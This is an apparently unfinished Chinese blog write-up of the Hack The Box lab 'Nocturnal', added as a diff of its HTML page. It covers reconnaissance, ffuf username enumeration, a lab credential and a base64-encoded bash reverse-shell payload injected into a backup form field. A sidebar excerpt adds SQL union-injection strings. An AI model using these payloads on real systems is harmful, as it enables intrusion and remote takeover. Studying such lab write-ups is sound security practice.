@@ -1,0 +1,182 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Practice | Sauy's corner</title><meta name="author" content="Sauy"><meta name="copyright" content="Sauy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-Nocturnalnamp扫描端口发现开了22和80端口  用whatweb扫描服务 扫出nocturnal.htb服务  这就是为什么访问IP什么都没有的原因 因为触发了重定向 1234567重定向机制：当你访问 http:&#x2F;&#x2F;10.10.11.64 时，服务端返回了一个 302 重定向，指示浏览器访问 http:&#x2F;&#x2F;nocturnal.htb&#x2F;。所以直接通过 IP 地址访问会触发重定向">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Practice">
+<meta property="og:url" content="http://example.com/2025/04/06/HTB-Practice/index.html">
+<meta property="og:site_name" content="Sauy&#39;s corner">
+<meta property="og:description" content="HTB-Nocturnalnamp扫描端口发现开了22和80端口  用whatweb扫描服务 扫出nocturnal.htb服务  这就是为什么访问IP什么都没有的原因 因为触发了重定向 1234567重定向机制：当你访问 http:&#x2F;&#x2F;10.10.11.64 时，服务端返回了一个 302 重定向，指示浏览器访问 http:&#x2F;&#x2F;nocturnal.htb&#x2F;。所以直接通过 IP 地址访问会触发重定向">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/2233.JPG">
+<meta property="article:published_time" content="2025-04-06T13:10:58.000Z">
+<meta property="article:modified_time" content="2025-04-20T13:50:35.599Z">
+<meta property="article:author" content="Sauy">
+<meta property="article:tag" content="渗透学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/2233.JPG"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB-Practice",
+  "url": "http://example.com/2025/04/06/HTB-Practice/",
+  "image": "http://example.com/img/2233.JPG",
+  "datePublished": "2025-04-06T13:10:58.000Z",
+  "dateModified": "2025-04-20T13:50:35.599Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Sauy",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/04/06/HTB-Practice/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-Practice',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: rgba(255, 255, 255, 0);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/2233.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/33.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Sauy's corner</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-Practice</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Practice</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-06T13:10:58.000Z" title="发表于 2025-04-06 21:10:58">2025-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-20T13:50:35.599Z" title="更新于 2025-04-20 21:50:35">2025-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-Nocturnal"><a href="#HTB-Nocturnal" class="headerlink" title="HTB-Nocturnal"></a>HTB-Nocturnal</h1><p>namp扫描端口发现开了22和80端口</p>
+<p><img src="C:\Users\sauy\Desktop\截图_2025-04-19_01-33-47.png" alt="截图_2025-04-19_01-33-47"></p>
+<p>用whatweb扫描服务 扫出nocturnal.htb服务</p>
+<p><img src="C:\Users\sauy\Desktop\截图_2025-04-19_01-51-15.png" alt="截图_2025-04-19_01-51-15"></p>
+<p>这就是为什么访问IP什么都没有的原因 因为触发了重定向</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">重定向机制：</span><br><span class="line"></span><br><span class="line">当你访问 http://10.10.11.64 时，服务端返回了一个 302 重定向，指示浏览器访问 http://nocturnal.htb/。</span><br><span class="line"></span><br><span class="line">所以直接通过 IP 地址访问会触发重定向，导致无法正常查看网页。</span><br><span class="line"></span><br><span class="line">你需要配置 /etc/hosts 来将 nocturnal.htb 指向 10.10.11.64，然后再访问才行。</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>echo &quot;10.10.11.64 nocturnal.htb&quot; | sudo tee -a /etc/hosts</code>  随后访问<a target="_blank" rel="noopener" href="http://nocturnal.htb/">http://nocturnal.htb/</a></p>
+<p>发现可以登录注册 注册一个进去发现文件上传功能 只能传限定后缀</p>
+<p>然后点上传文件后的位置过后 发现可疑路由 <code>http://nocturnal.htb/view.php?username=FUZZ&amp;file=1.pdf</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─# ffuf -u &#x27;http://nocturnal.htb/view.php?username=FUZZ&amp;file=1.pdf&#x27; -w /home/kali/桌面/burp_dictionary/username.txt -H &#x27;Cookie: PHPSESSID=a7bchnag1hj5dcund9sf8f9r39&#x27;  -fs 2985 </span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://nocturnal.htb/view.php?username=FUZZ&amp;file=1.pdf</span><br><span class="line"> :: Wordlist         : FUZZ: /home/kali/桌面/burp_dictionary/username.txt</span><br><span class="line"> :: Header           : Cookie: PHPSESSID=a7bchnag1hj5dcund9sf8f9r39</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 2985</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 411ms]</span><br><span class="line">1                       [Status: 200, Size: 14, Words: 1, Lines: 2, Duration: 449ms]</span><br><span class="line">root                    [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 615ms]</span><br><span class="line">test                    [Status: 200, Size: 3105, Words: 1175, Lines: 129, Duration: 615ms]</span><br><span class="line">amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 391ms]</span><br><span class="line">tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 235ms]</span><br><span class="line">:: Progress: [8886/8886] :: Job [1/1] :: 123 req/sec :: Duration: [0:01:02] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>
+
+<p>一个一个访问 发现username&#x3D;amanda 有可疑文件</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250419143530485.png" alt="image-20250419143530485"></p>
+<p>点击下载下来 打开获得文件内容</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250419143749165.png" alt="image-20250419143749165"></p>
+<p>帐号：amanda 密码：arHkG7HAI68X8s1J 登录进去发现一个 Admin Panel</p>
+<p>%0Abash%09-c%09’{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}’%0A</p>
+<p>password&#x3D;%0Abash%09-c%09’{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}’%0A&amp;backup&#x3D;</p>
+<p>python3 -m http.server 8000</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Sauy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/06/HTB-Practice/">http://example.com/2025/04/06/HTB-Practice/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Sauy's corner</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></div><div class="post-share"><div class="social-share" data-image="/img/2233.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="Sql-labs部分题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Sql-labs部分题解</div></div><div class="info-2"><div class="info-item-1">level-1字符型 ‘注入 1-1&#x27; union select 1,2,group_concat(username,id,password) from users--+  唯一注意点就是查询时要用-1 因为我们要得到union后的结果 level-2数字型注入 后面过程和level-1一样 1-1 union select 1,2,group_concat(username,id,password) from users--+  level-3输入1’ 回显中有个) 说明sql语句里有() 考虑加入) 与前面的( 构成闭合 1’ ) –+构造闭合成功 后面与level-1 level-2 一样 1-1&#x27;) union select 1,2,group_concat(username,id,password) from users--+  level-4双引号和括号构造闭合 1-1&quot;) union select 1,2,group_concat(username,id,password) from users--+  level-51’ –+...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/2233.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Sauy</div><div class="author-info-description">蓦然回首</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/415414982"><i class="/img/bilibili.ico"></i><span>Follow Me!</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">World belongs to us.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Nocturnal"><span class="toc-number">1.</span> <span class="toc-text">HTB-Nocturnal</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" title="浅谈python内存马">浅谈python内存马</a><time datetime="2025-04-16T14:30:30.000Z" title="发表于 2025-04-16 22:30:30">2025-04-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/TGCTF2025-WEB/" title="TGCTF2025-WEB WP">TGCTF2025-WEB WP</a><time datetime="2025-04-13T16:00:00.000Z" title="发表于 2025-04-14 00:00:00">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/10/python%E7%9B%B2%E6%B3%A8%E7%BB%93%E5%90%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" title="python盲注结合沙箱逃逸学习">python盲注结合沙箱逃逸学习</a><time datetime="2025-04-10T08:10:58.000Z" title="发表于 2025-04-10 16:10:58">2025-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化学习">pickle反序列化学习</a><time datetime="2025-04-10T08:10:58.000Z" title="发表于 2025-04-10 16:10:58">2025-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/" title="蜀道山2024wp">蜀道山2024wp</a><time datetime="2025-04-10T08:10:58.000Z" title="发表于 2025-04-10 16:10:58">2025-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Sauy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
